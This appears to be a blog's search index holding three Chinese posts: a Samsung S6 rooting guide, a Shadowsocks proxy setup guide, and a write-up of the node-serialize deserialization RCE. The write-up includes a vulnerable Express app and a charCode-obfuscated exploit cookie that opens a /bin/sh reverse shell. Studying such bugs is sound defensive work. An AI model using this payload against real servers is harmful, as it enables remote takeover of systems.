<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[三星S6-ROOT教程]]></title>
    <url>%2F2018%2F04%2F03%2F%E4%B8%89%E6%98%9FS6-ROOT%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[三星GALAXY S6利用odin3获取ROOT权限 一、CROM SERVER UNLOCK 同时按住&lt;音量下键&gt;+&lt;Home键&gt;+&lt;电源键&gt;进入刷机模式 按&lt;音量上键&gt;继续 查看“CROM SERVICE”状态（Lock为未解锁状态）（Unlock为已解锁状态） 下载解锁工作（链接: https://pan.baidu.com/s/1o8OIGoa 密码: pmxm）（已解锁略过此操作） 安装s6-lock-service&gt;&gt;s6-CROM.apk至手机中（安装完成后程序名为：CROM服务） 运行“CROM服务”程序，进行解锁。（解锁成功提示：设备已解锁。您可以安装自定义操作系统） 二、进行ROOT操作 下载root工具及刷机文件（链接: https://pan.baidu.com/s/1o8OIGoa 密码: pmxm） 安装“驱动–双击运行.exe”文件 同时按住&lt;音量下键&gt;+&lt;Home键&gt;+&lt;电源键&gt;进入刷机模式 按&lt;音量上键&gt;继续，进入root文件下载状态 运行刷机工具“shuaji》刷机工具》 Odin3 v3.11.1.exe” 点击“AP”加载刷机文件“shuaji》Root文件》g9200-Root-6.0.tar” 等待刷机结束（出现PASS时，表示刷机成功，关闭软件） 手机自动重启多次之后，root成功 三、ROOT验证 有多种方式可以验证手机是否root成功 方法一：adb shell $ su #（手机会弹出授权请求，允许授权请求后，adb shell进入井号模式） 方法二：一般的root工具都具有查看当前机器是否已经root 比如：这里使用adb]]></content>
  </entry>
  <entry>
    <title><![CDATA[聊一聊Node.js远程执行漏洞]]></title>
    <url>%2F2018%2F03%2F11%2F%E8%81%8A%E4%B8%80%E8%81%8ANode.js%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言​ 最近opsecx一篇有关IIFE（Immediately Invoked Function Expression）的远程代码执行漏洞的文章引起了我的注意，在nodejs项目中引入第三方库node-serialize进行序列化与反序列化时，由于IIFE的特性错误的调用了精心构造的payload而达到命令的执行。 0x01 漏洞复现新建测试文件夹，分别执行下列命令引入node-serialize库 npm init npm install node-serialize --save 编写测试文件进行调用 1234567var y = &#123; rce : function()&#123; require('child_process').exec('whoami', function(error, stdout, stderr) &#123; console.log(stdout) &#125;); &#125;(),&#125;var serialize = require('node-serialize');console.log("Serialized: \n" + serialize.serialize(y)); 运行产生子线程触发漏洞 0x02 漏洞分析我们分别对使用IIFE调用和不使用IIFE调用做断点分析。 可以看到node在解析对象时将rce解析为一个函数。并且从原型链中我们也可以看到function属性。而在使用IIFE调用时。 可以看到，此时node则将rce解析为一个经过IIFE调用后的一个undefined值，并且此时y还未被创建。我们继续跟进后，发现调用了child_process.js触发漏洞。 0x03 漏洞修复临时解决方案：对来自用户可控的参数进行数据过滤，或新增白名单。 后记​ 可以说node在处理IIFE上比较简单粗暴了，首先识别是否为IIFE若成立则立即执行函数，若参数可控则用户可以对服务器进行RCE。opsecx在文章中提供了一段代码，足以体现IIFE在node.js使用中不当造成的影响是难以预料的。 1234567891011121314151617181920212223var express = require('express');var cookieParser = require('cookie-parser');var escape = require('escape-html');var serialize = require('node-serialize');var app = express();app.use(cookieParser()) app.get('/', function(req, res) &#123; if (req.cookies.profile) &#123; var str = new Buffer(req.cookies.profile, 'base64').toString(); var obj = serialize.unserialize(str); if (obj.username) &#123; res.send("Hello " + escape(obj.username)); &#125; &#125; else &#123; res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", &#123; maxAge: 900000, httpOnly: true &#125;); &#125; res.send("Hello World");&#125;);app.listen(3000); 利用nodejsshell.py创建一个反弹shell。 然后，我们利用IIFE特性构造序列，当传入cookie后调用unserialize函数时触发漏洞。 1&#123;"rce":"_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,50,51,51,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))&#125;()"&#125; 原文地址：https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[科学上网]]></title>
    <url>%2F2018%2F03%2F10%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[​ 从10月开始朝廷的墙就开始发飙了，国内大部分VPN奔溃，可用的Server节点和ISP少之又少，本文就不再介绍国内像VPN-Grate、蓝灯这些命不久矣的VPN了，而是快速打造自己的梯子，尽管如此要想真正使自己梯子稳定不掉还需要更多手段来避免被墙。 0x01 选择提供商​ 如果要像打造自己的梯子，则需要购买一个云服务器。云服务器提供商像linode、vultr、digitalocean都是比较知名的国外服务器提供商，但是我不得不说这些服务在国内越来越多使用后将会变得越来越烂，而且天朝一般会对流量较大的网段采取一些措施，比如限制IP网段、ban掉那些服务器提供商。所以，要想梯子能长久，则需要不断更换服务器提供商，其实有些小众服务器提供商性价比都还是可以，如果对内存、容量要求特别的用户另谈。本文笔者还是介绍市面上比较常见的服务器提供商，以及其中我正在使用的小众提供商vpsfast。以后有机会我会介绍一些亲测后的小众服务器提供商供大家更换新梯子。 ​ 国外云服务器价格来说大体差不多，一个月基本都是5刀。Vultr还有2.5刀一个月但是一般都售罄了，大家还可以去搜一下优惠券什么的，像我之前用DO一般都要送个几十刀的优惠券让你使用。另外亚马逊的AWS绑定信用卡是可以免费试用1年VPS的，作为梯子完全够用。 0x02 购买云服务器​ 我们以vultr的云服务器为例，来简单介绍下如何快速搭建一个梯子。注册好账号后，选择vps的操作系统、位数这些参数。 一般东京、新加坡这些节点油管上看1080p问题都不大。 操作系统我一般喜欢用ubuntu的，之前用centOS感觉每次都要切换权限什么的很麻烦，版本的话随便选一个。 0x03 配置vps​ 购买好vps后在提供商会给你一个服务器的ip地址和登陆密码。我们主机如何操纵服务器呢，windows下可以使用putty这个界面化软件。（如果喜欢折腾的话可以设置公钥证书登录到服务器时间会节约一些网上有很多，随便找一个http://blog.csdn.net/shiqidide/article/details/8110958） Linux下和mac下可以直接在终端中使用ssh -q -l root -p 22 xxx.xx.xxx.xxx输入密码后即可登陆到服务器的22端口。 然后切换到root权限，sudo –s依次执行下面命令 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 下面选择一种四种语言编写的ss，默认使用python回车就好了 下面password为你登陆你梯子密码。Port端口表示梯子在服务器的多少端口上运行，端口一般选大一点，避开系统默认服务端口就行。 下面选择加密方式，表示你shadowsocks流量传输采用何种加密规则，默认就好了，然后等待安装一会。得到下面界面就安好了。 梯子的服务器端已经配置好了。 0x04 配置客户端Windows下需要下载shadowsocks客户端 https://github.com/shadowsocks/shadowsocks-windows/releases linux、mac可以按照qt-shadowsocks 或者使用ss-local命令网上教程也很多（eg. https://www.vpnhot.site/linux-shadowsocks.html） 运行shadowsocks客户端，点击添加服务器，将上面我们配置的参数填进去就好了。注意代理端口1080表示从梯子8989端口与我们本地1080端口连接起来，这样我们本地上网的流量通过1080端口后就直接与梯子的8989端口连接起来，流量就直接通过我们梯子中转后访问那些被墙的网站了。 0x05 梯子使用​ 浏览器上要想使用梯子，就需要让浏览器将流量走1080端口。对于chrome浏览器可以下一个SwitchyOmega插件，然后配置代理端口为1080 我们每次需要翻墙时就选择代理端口便可实现翻墙。 对于安卓手机和ios手机，下载客户端 安卓：https://github.com/shadowsocks/shadowsocks-android/releases IOS:商店中下载Shadowrocket正版要收费，网上有未越狱免费下载的方法 同样将配置文件输入后即可添加服务器，每次需要翻墙的时候再手机上启动即可。 0x06 后记​ 对于搭建一个ss简单的梯子现在使用一键脚本不到5分钟即可搭建好，但是为了应对天朝的高墙，可以采用一些手段去避免被墙，可以使用obfs混淆shadowsocks流量或者搭建GFW。Press大杀器，但是随着GFW的加强，如果直接限制了你服务器提供商的ip网段，也就无计可施了。]]></content>
      <categories>
        <category>Misc</category>
      </categories>
  </entry>
</search>
